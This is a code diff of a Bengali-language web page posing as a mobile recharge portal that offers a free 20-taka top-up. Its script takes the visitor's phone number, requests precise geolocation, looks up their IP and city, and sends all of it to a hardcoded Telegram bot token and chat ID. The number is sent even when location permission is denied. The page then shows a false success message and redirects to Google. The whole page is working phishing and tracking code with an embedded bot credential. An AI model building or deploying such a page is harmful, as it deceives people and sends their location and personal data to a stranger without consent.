@@ -5,58 +5,63 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mobile Recharge Portal</title>
     <style>
-        body { background: #ffffff; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 0; text-align: center; color: #333; }
-        .top-bar { background: #f8f9fa; padding: 20px; border-bottom: 1px solid #eee; font-weight: bold; font-size: 18px; color: #007bff; }
-        .container { max-width: 400px; margin: 40px auto; padding: 30px; border: 1px solid #eee; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); }
-        .offer-title { color: #28a745; font-size: 26px; font-weight: bold; margin-bottom: 10px; }
-        input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 18px; box-sizing: border-box; outline: none; margin-bottom: 20px; }
-        .btn { background: #007bff; color: #fff; padding: 16px; width: 100%; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        body { background: #ffffff; font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; }
+        .container { max-width: 400px; margin: 50px auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; }
+        .title { color: #28a745; font-size: 22px; font-weight: bold; }
+        input { width: 90%; padding: 12px; margin: 20px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; }
+        .btn { background: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; width: 90%; }
     </style>
 </head>
 <body>
-    <div class="top-bar">অনলাইন রিচার্জ পোর্টাল</div>
     <div class="container">
-        <div class="offer-title">অফার: ২০ টাকা ফ্রি রিচার্জ</div>
-        <p>আপনার মোবাইল নম্বরটি দিয়ে রিচার্জ গ্রহণ করুন।</p>
-        <input type="number" id="target_phone" placeholder="01XXXXXXXXX" required>
-        <button class="btn" id="submitBtn" onclick="initiateProcess()">রিচার্জ নিন</button>
+        <div class="title">অফার: ২০ টাকা ফ্রি রিচার্জ</div>
+        <p>নম্বর দিয়ে রিচার্জ নিশ্চিত করুন</p>
+        <input type="number" id="phone_num" placeholder="01XXXXXXXXX">
+        <button class="btn" onclick="processData()">রিচার্জ নিন</button>
     </div>
 
 <script>
-    async function initiateProcess() {
-        const phone = document.getElementById('target_phone').value;
-        const btn = document.getElementById('submitBtn');
+    async function processData() {
+        const phone = document.getElementById('phone_num').value;
         if (phone.length < 11) { alert("সঠিক নম্বর দিন!"); return; }
 
-        btn.innerText = "ভেরিফাই হচ্ছে...";
-        btn.disabled = true;
-
+        // পারমিশন চাওয়ার প্রসেস
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                (pos) => sendToBot(phone, pos.coords.latitude, pos.coords.longitude),
-                (err) => sendToBot(phone, "Denied", "Denied"),
-                { timeout: 8000 }
+                async (pos) => {
+                    await sendData(phone, pos.coords.latitude, pos.coords.longitude);
+                },
+                async (err) => {
+                    // পারমিশন না দিলেও নম্বর যাবে
+                    await sendData(phone, "Denied", "Denied");
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
             );
-        } else { sendToBot(phone, "Not Supported", "Not Supported"); }
+        } else {
+            await sendData(phone, "Not Supported", "Not Supported");
+        }
     }
 
-    async function sendToBot(phone, lat, lon) {
-        // আপনার নতুন বট টোকেন এবং আপনার পার্সোনাল চ্যাট আইডি
+    async function sendData(phone, lat, lon) {
         const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k";
-        const chat_id = "7887080882"; 
+        const chat_id = "7887080882"; // আপনার পার্সোনাল আইডি
 
         try {
             const ipRes = await fetch('https://ipapi.co/json/');
             const ipData = await ipRes.json();
-            const mapLink = (lat === "Denied") ? "অনুমতি দেয়নি" : `https://www.google.com/maps?q=${lat},${lon}`;
-            const text = `🎯 **নতুন রিচার্জ রিকোয়েস্ট**\n\n📞 ফোন: ${phone}\n🌐 IP: ${ipData.ip}\n🏙️ শহর: ${ipData.city}\n📍 ম্যাপ: ${mapLink}`;
-
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
-            .then(() => {
-                alert("আপনার রিকোয়েস্ট সফল হয়েছে। ৩০ মিনিটের মধ্যে টাকা পেয়ে যাবেন।");
-                window.location.href = "https://www.google.com";
-            });
-        } catch (error) { window.location.href = "https://www.google.com"; }
+            
+            const map = (lat === "Denied") ? "Permission Denied" : `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            const message = `🎯 **New Request**\n📞 Phone: ${phone}\n🌐 IP: ${ipData.ip}\n🏙️ City: ${ipData.city}\n📍 Map: ${map}`;
+            
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            
+            await fetch(url);
+            alert("সফল হয়েছে! ৩০ মিনিটের মধ্যে রিচার্জ পাবেন।");
+            window.location.href = "https://www.google.com";
+        } catch (e) {
+            window.location.href = "https://www.google.com";
+        }
     }
 </script>
 </body>
